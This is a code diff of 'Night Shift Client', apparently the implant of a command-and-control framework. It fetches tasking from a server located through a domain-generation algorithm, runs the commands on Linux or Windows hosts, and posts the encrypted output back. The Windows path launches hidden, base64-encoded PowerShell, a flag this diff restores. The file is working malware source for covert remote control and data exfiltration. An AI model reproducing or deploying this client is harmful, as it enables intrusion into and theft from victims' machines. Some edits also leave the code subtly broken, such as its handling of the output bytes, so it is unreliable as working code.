@@ -1,20 +1,20 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # Night Shift Client
-#
+
 import aiohttp
 import asyncio
+import base64
+import json
 import os
+import subprocess
 import sys
 import time
-import json
-import subprocess
-import base64
-from random import randrange
+from colorama import Fore, Back, Style
 from datetime import datetime
+from random import randrange
 from subprocess import (PIPE, Popen)
-from nightshift_dga import NightShift_DGA
-from nightshift_cipher import NightShift_Cipher
+from nightshift_utility import NightShift_Cipher, NightShift_DGA
 from nightshift_client_init import NightShift_Init_Check
 
 class NightShift_Client():
@@ -53,32 +53,34 @@ class NightShift_Client():
                     ns_host_os_cmd_fof = ns_json_payload['host_cmd_404']
                     ns_host_slpstate_fof = ns_json_payload['host_slpstate_404']
                     if (ns_host_fof == 'ALL' and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
-                        print('Do all the Linux things')
+                        #print('Do all the Linux things')
                         ns_get_output = self.os_posix(ns_host_os_cmd_fof)
                         ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                         ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                         ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                     elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'posix' and ns_host_os_fof == ns_host_os):
-                        print('Specific Linux Host')
+                        #print('Specific Linux Host')
                         ns_get_output = self.os_posix(ns_host_os_cmd_fof)
                         ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                         ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                         ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                     elif (ns_host_fof == 'ALL' and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
+                        #print('Do all the NT things')
                         ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
+                        #print(ns_get_output)
                         ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
+                        #print(ns_json_cmd_output)
                         ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
-                        ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
+                        #print(ns_post_data)
+                        #ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                     elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
-                        print('Specific NT Host')
+                        #print('Specific NT Host')
                         ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
                         ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
                         ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                         #ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                     else:
-                        print('Not my turn, I will take a nap')
                         ns_data_post_resp = 'Not my turn, I will take a nap'
-                        #pass
                     if ns_host_slpstate_fof >= 1:
                         ns_ss_sec = 60 * ns_host_slpstate_fof
                     else:
@@ -131,11 +133,20 @@ class NightShift_Client():
 
     def os_winnt(self, ns_host_os_cmd_fof):
         time_stamp = datetime.now()
-        #ns_ps_cmd = 'powershell -nop -win hidden -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
-        ns_ps_cmd = 'powershell -nop -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
-        output = (Popen(ns_ps_cmd, stdout=PIPE, shell=True).stdout.read()).decode('ascii')
+        ns_ps_cmd = 'powershell -nop -win hidden -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
+        output = (Popen(ns_ps_cmd, stdout=PIPE, shell=True).stdout.read())
         output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
         return time_stamp, output_b64
 
 if __name__ == "__main__":
+    print(Fore.GREEN + r"""
+    ╔═╗─╔╗───╔╗─╔╗╔═══╦╗───╔═╦╗──╔══╗─────────────────╔╗╔╗─────╔═╗╔═╗──╔╗──────╔╗─╔╗─╔═══╗╔╗
+    ║║╚╗║║───║║╔╝╚╣╔═╗║║───║╔╝╚╗─║╔╗║────────────────╔╝╚╣║─────║║╚╝║║──║║──────║║╔╝╚╗║╔═╗║║║
+    ║╔╗╚╝╠╦══╣╚╩╗╔╣╚══╣╚═╦╦╝╚╗╔╬╗║╚╝╚╦╗╔╦═╦═╗╔╦═╗╔══╗╚╗╔╣╚═╦══╗║╔╗╔╗╠╦═╝╠═╗╔╦══╣╚╩╗╔╝║║─║╠╣║
+    ║║╚╗║╠╣╔╗║╔╗║║╚══╗║╔╗╠╬╗╔╣║╚╝║╔═╗║║║║╔╣╔╗╬╣╔╗╣╔╗║─║║║╔╗║║═╣║║║║║╠╣╔╗║╔╗╬╣╔╗║╔╗║║─║║─║╠╣║
+    ║║─║║║║╚╝║║║║╚╣╚═╝║║║║║║║║╚╦╗║╚═╝║╚╝║║║║║║║║║║╚╝║─║╚╣║║║║═╣║║║║║║║╚╝║║║║║╚╝║║║║╚╗║╚═╝║║╚╗
+    ╚╝─╚═╩╩═╗╠╝╚╩═╩═══╩╝╚╩╝╚╝╚═╩╝╚═══╩══╩╝╚╝╚╩╩╝╚╩═╗║─╚═╩╝╚╩══╝╚╝╚╝╚╩╩══╩╝╚╩╩═╗╠╝╚╩═╝╚═══╩╩═╝
+    ──────╔═╝║───────────────────────────────────╔═╝║───────────────────────╔═╝║ Client
+    ──────╚══╝───────────────────────────────────╚══╝───────────────────────╚══╝ version 0.9
+            """)
     NightShift_Client().run()
